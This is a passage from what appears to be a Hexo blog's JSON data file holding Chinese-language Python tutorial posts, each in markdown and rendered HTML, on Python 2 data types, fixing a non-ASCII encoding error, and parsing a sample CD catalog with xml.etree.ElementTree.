href=\"http://www.runoob.com/python/python-variable-types.html\" target=\"_blank\" rel=\"external\">Python 变量类型</a></li>\n<li><a href=\"http://www.runoob.com//python/python-numbers.html\" target=\"_blank\" rel=\"external\">Python Number(数字)</a></li>\n<li><a href=\"http://www.runoob.com//python/python-strings.html\" target=\"_blank\" rel=\"external\">Python 字符串</a></li>\n<li><a href=\"http://www.runoob.com//python/python-lists.html\" target=\"_blank\" rel=\"external\">Python 列表(List)</a></li>\n<li><a href=\"http://www.runoob.com//python/python-tuples.html\" target=\"_blank\" rel=\"external\">Python 元组</a></li>\n<li><a href=\"http://www.runoob.com//python/python-dictionary.html\" target=\"_blank\" rel=\"external\">Python 字典(Dictionary)</a></li>\n</ul>\n","excerpt":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、标准数据类型\"><a href=\"#一、标准数据类型\" class=\"headerlink\" title=\"一、标准数据类型\"></a>一、标准数据类型</h2><p>Python有五个标准的数据类型：</p>\n<ul>\n<li>Numbers（数字）</li>\n<li>String（字符串）</li>\n<li>List（列表）</li>\n<li>Tuple（元组）</li>\n<li>Dictionary（字典）</li>\n</ul>\n<h2 id=\"二、数字\"><a href=\"#二、数字\" class=\"headerlink\" title=\"二、数字\"></a>二、数字</h2><p>Python支持四种不同的数字类型：</p>\n<ul>\n<li>int（有符号整型）</li>\n<li>long（长整型[也可以代表八进制和十六进制]）</li>\n<li>float（浮点型）</li>\n<li>complex（复数）</li>\n</ul>\n<p>长整型定义在数值后添加一个小写或者大写的”L”，python中没有double类型数字。</p>\n<p>使用完一个对象后，可通过del关键字删除对象引用。语法：<br>del var1[,var2[,var3[….,varN]]]]<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">value = <span class=\"number\">25</span></div><div class=\"line\">string = <span class=\"string\">\"yes\"</span></div><div class=\"line\"><span class=\"keyword\">del</span> value, string</div></pre></td></tr></table></figure></p>\n<p>如若在删除对象引用还继续使用对象的话，则会报变量未定义的错误：<code>NameError: name &#39;value&#39; is not defined</code></p>","more":"<h2 id=\"三、字符串\"><a href=\"#三、字符串\" class=\"headerlink\" title=\"三、字符串\"></a>三、字符串</h2><h2 id=\"四、列表\"><a href=\"#四、列表\" class=\"headerlink\" title=\"四、列表\"></a>四、列表</h2><h2 id=\"五、元组\"><a href=\"#五、元组\" class=\"headerlink\" title=\"五、元组\"></a>五、元组</h2><h2 id=\"六、字典\"><a href=\"#六、字典\" class=\"headerlink\" title=\"六、字典\"></a>六、字典</h2><h2 id=\"七、数据类型转换\"><a href=\"#七、数据类型转换\" class=\"headerlink\" title=\"七、数据类型转换\"></a>七、数据类型转换</h2><table>\n<thead>\n<tr>\n<th>函数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>int(x [,base ])</td>\n<td>将x转换为一个整数</td>\n</tr>\n<tr>\n<td>long(x [,base ])</td>\n<td>将x转换为一个长整数</td>\n</tr>\n<tr>\n<td>float(x )</td>\n<td>将x转换到一个浮点数</td>\n</tr>\n<tr>\n<td>complex(real [,imag ])</td>\n<td>创建一个复数</td>\n</tr>\n<tr>\n<td>str(x)</td>\n<td>将对象 x 转换为字符串</td>\n</tr>\n<tr>\n<td>repr(x)</td>\n<td>将对象 x 转换为表达式字符串</td>\n</tr>\n<tr>\n<td>eval(str)</td>\n<td>用来计算在字符串中的有效Python表达式,并返回一个对象</td>\n</tr>\n<tr>\n<td>tuple(s)</td>\n<td>将序列 s 转换为一个元组</td>\n</tr>\n<tr>\n<td>list(s)</td>\n<td>将序列 s 转换为一个列表</td>\n</tr>\n<tr>\n<td>chr(x)</td>\n<td>将一个整数转换为一个字符</td>\n</tr>\n<tr>\n<td>unichr(x)</td>\n<td>将一个整数转换为Unicode字符</td>\n</tr>\n<tr>\n<td>ord(x)</td>\n<td>将一个字符转换为它的整数值</td>\n</tr>\n<tr>\n<td>hex(x)</td>\n<td>将一个整数转换为一个十六进制字符串</td>\n</tr>\n<tr>\n<td>oct(x)</td>\n<td>将一个整数转换为一个八进制字符串</td>\n</tr>\n</tbody>\n</table>\n<p>对于数值转换而言，如果字面量不是一个整数，会报错：<code>ValueError: invalid literal for int() with base 10: &#39;1s</code><br>正确实例：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a=<span class=\"string\">\"12\"</span>; long(a);</div><div class=\"line\"><span class=\"number\">12L</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a=<span class=\"string\">\"12\"</span>; int(a);</div><div class=\"line\"><span class=\"number\">12</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a=<span class=\"string\">\"12\"</span>; float(a);</div><div class=\"line\"><span class=\"number\">12.0</span></div></pre></td></tr></table></figure></p>\n<p>对于元组，列表转换而言，如果字面量不可迭代，会报错：<code>TypeError: &#39;int&#39; object is not iterable</code><br>正确实例：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a=<span class=\"string\">'12'</span>; list(a);</div><div class=\"line\">[<span class=\"string\">'1'</span>, <span class=\"string\">'2'</span>]</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a=<span class=\"string\">'12'</span>; tuple(a);</div><div class=\"line\">(<span class=\"string\">'1'</span>, <span class=\"string\">'2'</span>)</div></pre></td></tr></table></figure></p>\n<h2 id=\"八、参考文档\"><a href=\"#八、参考文档\" class=\"headerlink\" title=\"八、参考文档\"></a>八、参考文档</h2><ul>\n<li><a href=\"http://www.runoob.com/python/python-variable-types.html\">Python 变量类型</a></li>\n<li><a href=\"http://www.runoob.com//python/python-numbers.html\">Python Number(数字)</a></li>\n<li><a href=\"http://www.runoob.com//python/python-strings.html\">Python 字符串</a></li>\n<li><a href=\"http://www.runoob.com//python/python-lists.html\">Python 列表(List)</a></li>\n<li><a href=\"http://www.runoob.com//python/python-tuples.html\">Python 元组</a></li>\n<li><a href=\"http://www.runoob.com//python/python-dictionary.html\">Python 字典(Dictionary)</a></li>\n</ul>"},{"title":"python打印中文异常","date":"2016-05-01T11:46:00.000Z","_content":"\n<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n\n## 一、背景\n脚本里需要打印中文内容。\n\n\n## 二、脚本\n``` python\n'''\nCreated on Apr 27, 2016\n\n@author: yeshaoting\n'''\n\nif __name__ == '__main__':\n    print '你好，python!'\n```\n\n\n## 三、问题\npython脚本里包含有中文时，报如下错误：\n``` bash\nTraceback (most recent call last):\n  File \"/Applications/STS.app/Contents/Eclipse/plugins/org.python.pydev_4.5.5.201603221110/pysrc/pydevd.py\", line 1529, in <module>\n    globals = debugger.run(setup['file'], None, None, is_module)\n  File \"/Applications/STS.app/Contents/Eclipse/plugins/org.python.pydev_4.5.5.201603221110/pysrc/pydevd.py\", line 936, in run\n    pydev_imports.execfile(file, globals, locals)  # execute the script\n  File \"/Users/yeshaoting/java/workspace/python-workspace/HelloPython/base/HelloWorld.py\", line 8\nSyntaxError: Non-ASCII character '\\xe4' in file /Users/yeshaoting/java/workspace/python-workspace/HelloPython/base/HelloWorld.py on line 8, but no encoding declared; see http://python.org/dev/peps/pep-0263/ for details\n```\n\n<!-- more -->\n\n## 四、解决方法\n告诉python解释器，按照utf-8编码读取源代码。\n\n具体做法：在python脚本开头添加如下内容：\n``` python\n#coding=utf-8\n```\n或者：\n``` python\n#-*- coding: utf-8 -*-\n```\n\n**注**：此内容必须放在脚本shebang后一行(不允许隔空行)或者放在脚本第一行。\n\n\n## 实例\n``` python\n#!/usr/bin/python\n#coding=utf-8\n\nprint \"你好，世界\";\n```\n\n\n## 六、参考文档\n[Python 中文编码](http://www.runoob.com/python/python-chinese-encoding.html)\n[也谈 Python 的中文编码处理](http://in355hz.iteye.com/blog/1860787)\n","source":"_posts/article/python/python打印中文异常.md","raw":"title: python打印中文异常\ntags:\n  - python\ncategories:\n  - 系统脚本\ndate: 2016-05-01 19:46:00\n---\n\n<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n\n## 一、背景\n脚本里需要打印中文内容。\n\n\n## 二、脚本\n``` python\n'''\nCreated on Apr 27, 2016\n\n@author: yeshaoting\n'''\n\nif __name__ == '__main__':\n    print '你好，python!'\n```\n\n\n## 三、问题\npython脚本里包含有中文时，报如下错误：\n``` bash\nTraceback (most recent call last):\n  File \"/Applications/STS.app/Contents/Eclipse/plugins/org.python.pydev_4.5.5.201603221110/pysrc/pydevd.py\", line 1529, in <module>\n    globals = debugger.run(setup['file'], None, None, is_module)\n  File \"/Applications/STS.app/Contents/Eclipse/plugins/org.python.pydev_4.5.5.201603221110/pysrc/pydevd.py\", line 936, in run\n    pydev_imports.execfile(file, globals, locals)  # execute the script\n  File \"/Users/yeshaoting/java/workspace/python-workspace/HelloPython/base/HelloWorld.py\", line 8\nSyntaxError: Non-ASCII character '\\xe4' in file /Users/yeshaoting/java/workspace/python-workspace/HelloPython/base/HelloWorld.py on line 8, but no encoding declared; see http://python.org/dev/peps/pep-0263/ for details\n```\n\n<!-- more -->\n\n## 四、解决方法\n告诉python解释器，按照utf-8编码读取源代码。\n\n具体做法：在python脚本开头添加如下内容：\n``` python\n#coding=utf-8\n```\n或者：\n``` python\n#-*- coding: utf-8 -*-\n```\n\n**注**：此内容必须放在脚本shebang后一行(不允许隔空行)或者放在脚本第一行。\n\n\n## 实例\n``` python\n#!/usr/bin/python\n#coding=utf-8\n\nprint \"你好，世界\";\n```\n\n\n## 六、参考文档\n[Python 中文编码](http://www.runoob.com/python/python-chinese-encoding.html)\n[也谈 Python 的中文编码处理](http://in355hz.iteye.com/blog/1860787)\n","slug":"article/python/python打印中文异常","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxuy00785nbtreoasfsk","content":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>脚本里需要打印中文内容。</p>\n<h2 id=\"二、脚本\"><a href=\"#二、脚本\" class=\"headerlink\" title=\"二、脚本\"></a>二、脚本</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"string\">'''</span></div><div class=\"line\">Created on Apr 27, 2016</div><div class=\"line\"></div><div class=\"line\">@author: yeshaoting</div><div class=\"line\">'''</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'你好，python!'</span></div></pre></td></tr></table></figure>\n<h2 id=\"三、问题\"><a href=\"#三、问题\" class=\"headerlink\" title=\"三、问题\"></a>三、问题</h2><p>python脚本里包含有中文时，报如下错误：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">Traceback (most recent call last):</div><div class=\"line\">  File <span class=\"string\">\"/Applications/STS.app/Contents/Eclipse/plugins/org.python.pydev_4.5.5.201603221110/pysrc/pydevd.py\"</span>, line 1529, <span class=\"keyword\">in</span> &lt;module&gt;</div><div class=\"line\">    globals = debugger.run(setup[<span class=\"string\">'file'</span>], None, None, is_module)</div><div class=\"line\">  File <span class=\"string\">\"/Applications/STS.app/Contents/Eclipse/plugins/org.python.pydev_4.5.5.201603221110/pysrc/pydevd.py\"</span>, line 936, <span class=\"keyword\">in</span> run</div><div class=\"line\">    pydev_imports.execfile(file, globals, locals)  <span class=\"comment\"># execute the script</span></div><div class=\"line\">  File <span class=\"string\">\"/Users/yeshaoting/java/workspace/python-workspace/HelloPython/base/HelloWorld.py\"</span>, line 8</div><div class=\"line\">SyntaxError: Non-ASCII character <span class=\"string\">'\\xe4'</span> <span class=\"keyword\">in</span> file /Users/yeshaoting/java/workspace/python-workspace/HelloPython/base/HelloWorld.py on line 8, but no encoding declared; see http://python.org/dev/peps/pep-0263/ <span class=\"keyword\">for</span> details</div></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<h2 id=\"四、解决方法\"><a href=\"#四、解决方法\" class=\"headerlink\" title=\"四、解决方法\"></a>四、解决方法</h2><p>告诉python解释器，按照utf-8编码读取源代码。</p>\n<p>具体做法：在python脚本开头添加如下内容：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#coding=utf-8</span></div></pre></td></tr></table></figure></p>\n<p>或者：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#-*- coding: utf-8 -*-</span></div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：此内容必须放在脚本shebang后一行(不允许隔空行)或者放在脚本第一行。</p>\n<h2 id=\"实例\"><a href=\"#实例\" class=\"headerlink\" title=\"实例\"></a>实例</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"><span class=\"comment\">#coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"你好，世界\"</span>;</div></pre></td></tr></table></figure>\n<h2 id=\"六、参考文档\"><a href=\"#六、参考文档\" class=\"headerlink\" title=\"六、参考文档\"></a>六、参考文档</h2><p><a href=\"http://www.runoob.com/python/python-chinese-encoding.html\" target=\"_blank\" rel=\"external\">Python 中文编码</a><br><a href=\"http://in355hz.iteye.com/blog/1860787\" target=\"_blank\" rel=\"external\">也谈 Python 的中文编码处理</a></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>脚本里需要打印中文内容。</p>\n<h2 id=\"二、脚本\"><a href=\"#二、脚本\" class=\"headerlink\" title=\"二、脚本\"></a>二、脚本</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"string\">'''</div><div class=\"line\">Created on Apr 27, 2016</div><div class=\"line\"></div><div class=\"line\">@author: yeshaoting</div><div class=\"line\">'''</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'你好，python!'</span></div></pre></td></tr></table></figure>\n<h2 id=\"三、问题\"><a href=\"#三、问题\" class=\"headerlink\" title=\"三、问题\"></a>三、问题</h2><p>python脚本里包含有中文时，报如下错误：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">Traceback (most recent call last):</div><div class=\"line\">  File <span class=\"string\">\"/Applications/STS.app/Contents/Eclipse/plugins/org.python.pydev_4.5.5.201603221110/pysrc/pydevd.py\"</span>, line 1529, <span class=\"keyword\">in</span> &lt;module&gt;</div><div class=\"line\">    globals = debugger.run(setup[<span class=\"string\">'file'</span>], None, None, is_module)</div><div class=\"line\">  File <span class=\"string\">\"/Applications/STS.app/Contents/Eclipse/plugins/org.python.pydev_4.5.5.201603221110/pysrc/pydevd.py\"</span>, line 936, <span class=\"keyword\">in</span> run</div><div class=\"line\">    pydev_imports.execfile(file, globals, locals)  <span class=\"comment\"># execute the script</span></div><div class=\"line\">  File <span class=\"string\">\"/Users/yeshaoting/java/workspace/python-workspace/HelloPython/base/HelloWorld.py\"</span>, line 8</div><div class=\"line\">SyntaxError: Non-ASCII character <span class=\"string\">'\\xe4'</span> <span class=\"keyword\">in</span> file /Users/yeshaoting/java/workspace/python-workspace/HelloPython/base/HelloWorld.py on line 8, but no encoding declared; see http://python.org/dev/peps/pep-0263/ <span class=\"keyword\">for</span> details</div></pre></td></tr></table></figure></p>","more":"<h2 id=\"四、解决方法\"><a href=\"#四、解决方法\" class=\"headerlink\" title=\"四、解决方法\"></a>四、解决方法</h2><p>告诉python解释器，按照utf-8编码读取源代码。</p>\n<p>具体做法：在python脚本开头添加如下内容：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#coding=utf-8</span></div></pre></td></tr></table></figure></p>\n<p>或者：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#-*- coding: utf-8 -*-</span></div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：此内容必须放在脚本shebang后一行(不允许隔空行)或者放在脚本第一行。</p>\n<h2 id=\"实例\"><a href=\"#实例\" class=\"headerlink\" title=\"实例\"></a>实例</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"><span class=\"comment\">#coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"你好，世界\"</span>;</div></pre></td></tr></table></figure>\n<h2 id=\"六、参考文档\"><a href=\"#六、参考文档\" class=\"headerlink\" title=\"六、参考文档\"></a>六、参考文档</h2><p><a href=\"http://www.runoob.com/python/python-chinese-encoding.html\">Python 中文编码</a><br><a href=\"http://in355hz.iteye.com/blog/1860787\">也谈 Python 的中文编码处理</a></p>"},{"title":"xml.etree.ElementTree解析xml","date":"2016-05-22T12:12:00.000Z","_content":"\n\n<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n本文将介绍如何使用python基本类库xml.etree.ElementTree解析xml文档。\n\n## 一、前言\n\n### 1. xml解析支持\npython标准库提供三种方法解析XML: SAX、DOM以及ElementTree。\n\n#### SAX (simple API for XML )\npython 标准库包含SAX解析器，SAX用事件驱动模型，通过在解析XML的过程中触发一个个的事件并调用用户定义的回调函数来处理XML文件。\n\n#### DOM(Document Object Model)\n将XML数据在内存中解析成一个树，通过对树的操作来操作XML。\n\n#### ElementTree(元素树)\nElementTree就像一个轻量级的DOM，具有方便友好的API。代码可用性好，速度快，消耗内存少。\n\n### 2. ElementTree介绍\nxml.etree.ElementTree模块提供了一个轻量级、Pythonic的API，同时还有一个高效的C语言实现，即xml.etree.cElementTree。\n与DOM相比，ET的速度更快，API使用更直接、方便。\n与SAX相比，ET.iterparse函数同样提供了按需解析的功能，不会一次性在内存中读入整个文档。ET的性能与SAX模块大致相仿，但是它的API更加高层次，用户使用起来更加便捷。\n因此，使用python解析xml时，推荐使用ElementTree这种方式。\n\n\n<!-- more -->\n\n## 二、ElementTree详解\n\n### 1. 类库加载\nxml.etree.ElementTree有两种实现方式:纯python实现的xml.etree.ElementTree 和 C实现的xml.etree.cElementTree.\nC语言实现的版本，性能更加。如当前python版本包含了C语言实现的版本，优先使用。\n\n为了兼容旧版本的python，在加载xml.etree.ElementTree时，可以通过如下方式加载类库:\n```\ntry:\n    import xml.etree.cElementTree as ET\nexcept ImportError:\n    import xml.etree.ElementTree as ET\n```\n\n### 2. xml.etree.ElementTree对象\nxml.etree.ElementTree提供了两类对象：ElementTree对象和Element对象。\nElementTree将整个XML文档转化为树，对整个XML文档的交互（读取，写入，查找需要的元素），一般是在ElementTree层面进行的。\nElement则代表着树上的单个节点，对单个XML元素及其子元素，则是在Element层面进行的。\n\n### 3. ElementTree对象\n\n#### 解析xml\n**解析xml文件**\ntree = ET.parse(\"cd.xml\");\n\n**解析xml字符串**\ntree = ET.fromstring(cd_data_as_string)\n\n**注**:获得的tree变量即是一个ElementTree对象。\n\n#### 常用方法\ngetroot():获取根节点。\niter(tag=None):遍历当前元素及所有子元素。\n\n### 4. Element对象\n\n#### 对象属性\n每个Element对象都具有以下属性：\n- tag：string对象，表示数据代表的种类。\n- attrib：dictionary对象，表示附有的属性。\n- text：string对象，表示element的内容。\n- tail：string对象，表示element闭合之后的尾迹。\n- 若干子元素（child elements）。\n\n#### 常用方法\niter(tag=None)：生成遍历当前元素所有后代或者给定tag的后代的迭代器。(python2.7新特性)\nget(key, default=None)：获取key对应的属性值，如该属性不存在则返回default值。\nitems()：根据属性字典返回一个列表，列表元素为(key, value）。\nkeys()：返回包含所有元素属性键的列表。\n\n\n## 三、解析实例\n打印所有**艺术家**的名字、打印所有CD名称及对应的售价。\n\n### 1. 实例文档\n实例使用到的XML实例文件cd.xml内容如下：\n``` xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!-- Edited with XML Spy v2007 (http://www.altova.com) -->\n<CATALOG>\n\t<CD>\n\t\t<TITLE>Empire Burlesque</TITLE>\n\t\t<ARTIST>Bob Dylan</ARTIST>\n\t\t<COUNTRY>USA</COUNTRY>\n\t\t<COMPANY>Columbia</COMPANY>\n\t\t<PRICE>10.90</PRICE>\n\t\t<YEAR>1985</YEAR>\n\t</CD>\n\t<CD>\n\t\t<TITLE>Hide your heart</TITLE>\n\t\t<ARTIST>Bonnie Tyler</ARTIST>\n\t\t<COUNTRY>UK</COUNTRY>\n\t\t<COMPANY>CBS Records</COMPANY>\n\t\t<PRICE>9.90</PRICE>\n\t\t<YEAR>1988</YEAR>\n\t</CD>\n\t<CD>\n\t\t<TITLE>Greatest Hits</TITLE>\n\t\t<ARTIST>Dolly Parton</ARTIST>\n\t\t<COUNTRY>USA</COUNTRY>\n\t\t<COMPANY>RCA</COMPANY>\n\t\t<PRICE>9.90</PRICE>\n\t\t<YEAR>1982</YEAR>\n\t</CD>\n\t<CD>\n\t\t<TITLE>Still got the blues</TITLE>\n\t\t<ARTIST>Gary Moore</ARTIST>\n\t\t<COUNTRY>UK</COUNTRY>\n\t\t<COMPANY>Virgin records</COMPANY>\n\t\t<PRICE>10.20</PRICE>\n\t\t<YEAR>1990</YEAR>\n\t</CD>\n\t<CD>\n\t\t<TITLE>Eros</TITLE>\n\t\t<ARTIST>Eros Ramazzotti</ARTIST>\n\t\t<COUNTRY>EU</COUNTRY>\n\t\t<COMPANY>BMG</COMPANY>\n\t\t<PRICE>9.90</PRICE>\n\t\t<YEAR>1997</YEAR>\n\t</CD>\n</CATALOG>\n```\n\n### 2. 代码\n``` python\n#!/usr/bin/env python\n\nimport json\n\ntry:\n    import xml.etree.cElementTree as ET\nexcept ImportError:\n    print 'no c version Element Tree'\n    import xml.etree.ElementTree as ET\n\n\ndef parse_xml():\n    properties = {};\n\n    tree = ET.parse(\"cd.xml\");\n    docs = tree.getroot();\n\n    print_all_artist(docs);\n    print_all_cd_name_and_price(docs);\n\n\ndef print_all_artist(docs):\n    print '----------------------------'\n    for doc in docs.iter(\"ARTIST\"):\n        print doc.text\n\n\ndef print_all_cd_name_and_price(docs):\n    print '----------------------------'\n    for doc in docs:\n        line = ''\n        for field in doc:\n            if field.tag == 'TITLE':\n                line = line + field.text + \"\\t\"\n\n            if field.tag == 'PRICE':\n                line = line + field.text + \"\\t\"\n\n        print line\n\n\nif __name__ == '__main__':\n    parse_xml();\n```\n\n### 3. 运行结果\n``` bash\nyerba-buena:~ yeshaoting$ python parse_cd_xml.py\n----------------------------\nBob Dylan\nBonnie Tyler\nDolly Parton\nGary Moore\nEros Ramazzotti\n----------------------------\nEmpire Burlesque\t10.90\nHide your heart\t9.90\nGreatest Hits\t9.90\nStill got the blues\t10.20\nEros\t9.90\n```\n\n\n## 四、参考文档\n- [深入解读Python解析XML的几种方式](http://codingpy.com/article/parsing-xml-using-python/)\n- [Python 标准库之 xml.etree.ElementTree](http://www.cnblogs.com/ifantastic/archive/2013/04/12/3017110.html)\n- [Python XML解析](http://www.runoob.com/python/python-xml.html)","source":"_posts/article/python/xml.etree.ElementTree解析xml.md","raw":"title: xml.etree.ElementTree解析xml\ntags:\n  - python\ncategories:\n  - 系统脚本\ndate: 2016-05-22 20:12:00\n---\n\n\n<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n本文将介绍如何使用python基本类库xml.etree.ElementTree解析xml文档。\n\n## 一、前言\n\n### 1. xml解析支持\npython标准库提供三种方法解析XML: SAX、DOM以及ElementTree。\n\n#### SAX (simple API for XML )\npython 标准库包含SAX解析器，SAX用事件驱动模型，通过在解析XML的过程中触发一个个的事件并调用用户定义的回调函数来处理XML文件。\n\n#### DOM(Document Object Model)\n将XML数据在内存中解析成一个树，通过对树的操作来操作XML。\n\n#### ElementTree(元素树)\nElementTree就像一个轻量级的DOM，具有方便友好的API。代码可用性好，速度快，消耗内存少。\n\n### 2. ElementTree介绍\nxml.etree.ElementTree模块提供了一个轻量级、Pythonic的API，同时还有一个高效的C语言实现，即xml.etree.cElementTree。\n与DOM相比，ET的速度更快，API使用更直接、方便。\n与SAX相比，ET.iterparse函数同样提供了按需解析的功能，不会一次性在内存中读入整个文档。ET的性能与SAX模块大致相仿，但是它的API更加高层次，用户使用起来更加便捷。\n因此，使用python解析xml时，推荐使用ElementTree这种方式。\n\n\n<!-- more -->\n\n## 二、ElementTree详解\n\n### 1. 类库加载\nxml.etree.ElementTree有两种实现方式:纯python实现的xml.etree.ElementTree 和 C实现的xml.etree.cElementTree.\nC语言实现的版本，性能更加。如当前python版本包含了C语言实现的版本，优先使用。\n\n为了兼容旧版本的python，在加载xml.etree.ElementTree时，可以通过如下方式加载类库:\n```\ntry:\n    import xml.etree.cElementTree as ET\nexcept ImportError:\n    import xml.etree.ElementTree as ET\n```\n\n### 2. xml.etree.ElementTree对象\nxml.etree.ElementTree提供了两类对象：ElementTree对象和Element对象。\nElementTree将整个XML文档转化为树，对整个XML文档的交互（读取，写入，查找需要的元素），一般是在ElementTree层面进行的。\nElement则代表着树上的单个节点，对单个XML元素及其子元素，则是在Element层面进行的。\n\n### 3. ElementTree对象\n\n#### 解析xml\n**解析xml文件**\ntree = ET.parse(\"cd.xml\");\n\n**解析xml字符串**\ntree = ET.fromstring(cd_data_as_string)\n\n**注**:获得的tree变量即是一个ElementTree对象。\n\n#### 常用方法\ngetroot():获取根节点。\niter(tag=None):遍历当前元素及所有子元素。\n\n### 4. Element对象\n\n#### 对象属性\n每个Element对象都具有以下属性：\n- tag：string对象，表示数据代表的种类。\n- attrib：dictionary对象，表示附有的属性。\n- text：string对象，表示element的内容。\n- tail：string对象，表示element闭合之后的尾迹。\n- 若干子元素（child elements）。\n\n#### 常用方法\niter(tag=None)：生成遍历当前元素所有后代或者给定tag的后代的迭代器。(python2.7新特性)\nget(key, default=None)：获取key对应的属性值，如该属性不存在则返回default值。\nitems()：根据属性字典返回一个列表，列表元素为(key, value）。\nkeys()：返回包含所有元素属性键的列表。\n\n\n## 三、解析实例\n打印所有**艺术家**的名字、打印所有CD名称及对应的售价。\n\n### 1. 实例文档\n实例使用到的XML实例文件cd.xml内容如下：\n``` xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!-- Edited with XML Spy v2007 (http://www.altova.com) -->\n<CATALOG>\n\t<CD>\n\t\t<TITLE>Empire Burlesque</TITLE>\n\t\t<ARTIST>Bob Dylan</ARTIST>\n\t\t<COUNTRY>USA</COUNTRY>\n\t\t<COMPANY>Columbia</COMPANY>\n\t\t<PRICE>10.90</PRICE>\n\t\t<YEAR>1985</YEAR>\n\t</CD>\n\t<CD>\n\t\t<TITLE>Hide your heart</TITLE>\n\t\t<ARTIST>Bonnie Tyler</ARTIST>\n\t\t<COUNTRY>UK</COUNTRY>\n\t\t<COMPANY>CBS Records</COMPANY>\n\t\t<PRICE>9.90</PRICE>\n\t\t<YEAR>1988</YEAR>\n\t</CD>\n\t<CD>\n\t\t<TITLE>Greatest Hits</TITLE>\n\t\t<ARTIST>Dolly Parton</ARTIST>\n\t\t<COUNTRY>USA</COUNTRY>\n\t\t<COMPANY>RCA</COMPANY>\n\t\t<PRICE>9.90</PRICE>\n\t\t<YEAR>1982</YEAR>\n\t</CD>\n\t<CD>\n\t\t<TITLE>Still got the blues</TITLE>\n\t\t<ARTIST>Gary Moore</ARTIST>\n\t\t<COUNTRY>UK</COUNTRY>\n\t\t<COMPANY>Virgin 